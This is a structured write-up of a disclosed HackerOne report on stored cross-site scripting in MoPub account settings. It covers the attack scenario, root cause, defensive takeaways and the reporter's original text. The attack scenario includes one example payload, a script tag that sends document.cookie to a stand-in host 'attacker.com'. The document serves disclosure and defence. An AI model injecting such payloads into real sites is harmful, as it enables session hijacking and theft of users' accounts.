# Multiple Stored XSS in MoPub Account Settings Enabling Session Hijacking

## Metadata
- **Source:** HackerOne
- **Report:** 503298 | https://hackerone.com/reports/503298
- **Submitted:** 2019-02-28
- **Reporter:** giddsec
- **Program:** Twitter/MoPub
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Insufficient Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
Multiple stored XSS vulnerabilities exist in MoPub account settings pages across company information fields (company name, currency) and user settings. The vulnerabilities allow both administrators and members to inject malicious scripts that execute when victims access account settings, reports tab, or user management pages, enabling arbitrary session hijacking regardless of role.

## Attack scenario
1. Attacker logs into MoPub account as member or administrator
2. Attacker navigates to Account Settings and injects XSS payload (e.g., <script>fetch('attacker.com?cookie='+document.cookie)</script>) into currency field or company name field
3. Payload is stored server-side without proper sanitization or encoding
4. Victim logs in or visits account settings, reports tab, edit user settings, or views company dropdown in email selector
5. Stored XSS payload executes in victim's browser with full session context
6. Attacker's JavaScript steals session cookies/tokens, performs actions as victim, or redirects to phishing page

## Root cause
Insufficient input validation and output encoding of user-supplied data in account settings forms. User input from currency and company information fields is stored in database without sanitization and rendered in HTML context without proper encoding on multiple pages (account settings, reports, user settings, company dropdown).

## Attacker mindset
Opportunistic insider threat - attacker leverages legitimate account access to escalate privileges or hijack higher-privileged accounts. Bidirectional attack vector attractive because members can target admins and vice versa. Persistence through stored payload ensures repeated exploitation without re-injection.

## Defensive takeaways
- Implement strict input validation on all account settings fields - whitelist allowed characters and reject special HTML/JavaScript characters
- Apply context-appropriate output encoding (HTML entity encoding, JavaScript escaping) when rendering user-controlled data in HTML, JavaScript, or URL contexts
- Utilize templating engines with auto-escaping enabled by default
- Implement Content Security Policy (CSP) with strict directives to prevent inline script execution
- Use security headers (X-XSS-Protection, X-Content-Type-Options) as defense-in-depth
- Conduct comprehensive security audit of all user input fields across account settings, company information, and user management modules
- Implement automated security testing (SAST/DAST) to catch XSS in account settings pages
- Sanitize data on both input (validation) and output (encoding) layers
- Review role-based access controls to ensure members cannot modify fields accessible to administrators

## Variant hunting
Search for other account/profile settings pages accepting free-form text (email, phone, address, description fields)
Audit all dropdown menus and email selectors that display user-controlled company information
Review report generation features that might render user-supplied data
Test all role-based settings pages (admin panel, member dashboard) for XSS
Examine API endpoints for account settings to identify potential reflected XSS in API responses
Check user profile pages, team pages, and organizational charts for similar vulnerabilities
Test file upload features in account settings for SVG-based XSS or polyglot attacks

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1539

## Notes
Reporter indicates this is a resubmission following incomplete patching - original report #485748 was marked fixed but duplicate issues #492444 and #492913 still vulnerable. Suggests the vendor applied narrow fix rather than addressing root cause across all affected input fields. Vice versa attack vector is particularly concerning as it breaks typical privilege assumptions. Presence of video demonstration (F432851) and permission analysis (F432849) indicates well-documented report. The bidirectional nature (member hijacking admin and admin hijacking member) increases severity for organizational security posture.

## Full report
<details><summary>Expand</summary>

### Note:
Hello Twitter Team, I just noticed that my report #485748 is already fixed, can you confirm? but my other duplicate reports aren't and still exists. #492444 #492913 are you sure it's on the **same root cause**? because I think the broad fix is already released but didn't fix the other issues.
I will make a report here so you'll notice. I will merge #492444 #492913 here. I'm also thinking for Twitter Security. I'm monitoring MoPub since report #485748 was set on triage. 

*The broad fix didn't really fixed all issues, that's why I'm resubmitting these issues.*

##Description: 
An issue that can be performed **vice versa**. That a member can hijack a admin or admin hijack a member by injecting a malicious scripts in the **accounts settings**.

##Steps to reproduce:

1. Login to MoPub: https://app.mopub.com/account/login/
2. Go to **account settings** (*almost everything here is vulnerable to XSS*)
3. Inject on **currency**
4. You can also inject on **company's information** (*every input is vulnerable to XSS*) 

**Cases of injecting on company's name** 
- When the victim go to **report's tab** XSS will trigger. (*even if the victim is on his/her original company, attacker's company still visible on email drop down menu.*)  
- When the victim go to **account settings** XSS will trigger.  
- When the victim go to **edit user settings** XSS will trigger.  

**Cases of injecting on currency**(vice versa attack)
- Administrator can inject malicious payload in **currency** can hijack member's session. (XSS triggers on member's end) 
- Member can inject malicious payload in **currency** can hijack administrator's session. (XSS triggers on administrator's end)

I provided a **Full Demonstration of the vulnerability**
F432851

**Based on Roles and Permissions:**
(Vice Versa Attack)

- Members can make changes in the account, but they cannot add new users, change other users' roles or view payment information. F432849

## Impact

This vulnerability can impact other users invited by the attacker. And it is Stored XSS that every time the victim visits the vulnerable endpoints, XSS will trigger. The impact here is the attacker can hijack the victim's session.

It's also a vice versa attack. the attacker could be the administrator or the member.

</details>

---
*Analysed by Claude on 2026-05-12*
